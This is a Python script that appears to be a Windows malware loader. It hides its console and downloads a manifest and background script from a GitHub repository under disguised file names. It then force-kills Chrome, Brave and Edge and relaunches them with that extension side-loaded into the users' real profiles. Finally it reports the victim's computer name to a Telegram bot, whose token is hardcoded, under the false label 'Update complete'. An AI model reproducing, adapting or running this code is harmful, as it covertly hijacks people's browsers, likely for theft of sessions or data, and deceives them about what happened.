import os, sys, time, urllib.request, json, subprocess, ctypes

BOT_TOKEN = "8643047680:AAHo3nHwTpcilK3uNE_DIuJudGX3G3cOc44"
CHAT_ID = "962420340"
EXT_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Templates')

def download_files():
    os.makedirs(EXT_DIR, exist_ok=True)
    files = {
        'config.json': 'https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/manifest.json',
        'service.js': 'https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets/background.js'
    }
    for name, url in files.items():
        try: urllib.request.urlretrieve(url, os.path.join(EXT_DIR, name))
        except: pass
    # Rename to actual extension files
    try:
        if os.path.exists(os.path.join(EXT_DIR, 'config.json')):
            os.rename(os.path.join(EXT_DIR, 'config.json'), os.path.join(EXT_DIR, 'manifest.json'))
        if os.path.exists(os.path.join(EXT_DIR, 'service.js')):
            os.rename(os.path.join(EXT_DIR, 'service.js'), os.path.join(EXT_DIR, 'background.js'))
    except: pass

def kill_browsers():
    for exe in ['chrome.exe', 'brave.exe', 'msedge.exe']:
        os.system(f'taskkill /F /IM {exe} >nul 2>&1')
    time.sleep(3)

def launch(path, user_data):
    if os.path.exists(path):
        try:
            subprocess.Popen([
                path,
                f'--load-extension={EXT_DIR}',
                f'--user-data-dir={user_data}',
                '--profile-directory=Default',
                '--no-first-run',
                '--no-default-browser-check'
            ], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

def restart_browsers():
    base = os.path.expanduser('~')
    local = os.getenv('LOCALAPPDATA')
    
    # Chrome — all possible paths
    launch(r"C:\Program Files\Google\Chrome\Application\chrome.exe", os.path.join(local, 'Google', 'Chrome', 'User Data'))
    launch(r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", os.path.join(local, 'Google', 'Chrome', 'User Data'))
    launch(os.path.join(local, 'Google', 'Chrome', 'Application', 'chrome.exe'), os.path.join(local, 'Google', 'Chrome', 'User Data'))
    
    # Brave
    launch(r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'))
    launch(os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'), os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'))
    
    # Edge
    launch(r"C:\Program Files\Microsoft\Edge\Application\msedge.exe", os.path.join(local, 'Microsoft', 'Edge', 'User Data'))

def notify():
    try:
        data = json.dumps({'chat_id': CHAT_ID, 'text': f'✓ Update complete\nPC: {os.getenv("COMPUTERNAME")}', 'parse_mode': 'HTML'}).encode()
        urllib.request.urlopen(urllib.request.Request(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', data=data, headers={'Content-Type': 'application/json'}))
    except: pass

if __name__ == '__main__':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    download_files()
    kill_browsers()
    restart_browsers()
    notify()
    time.sleep(1)
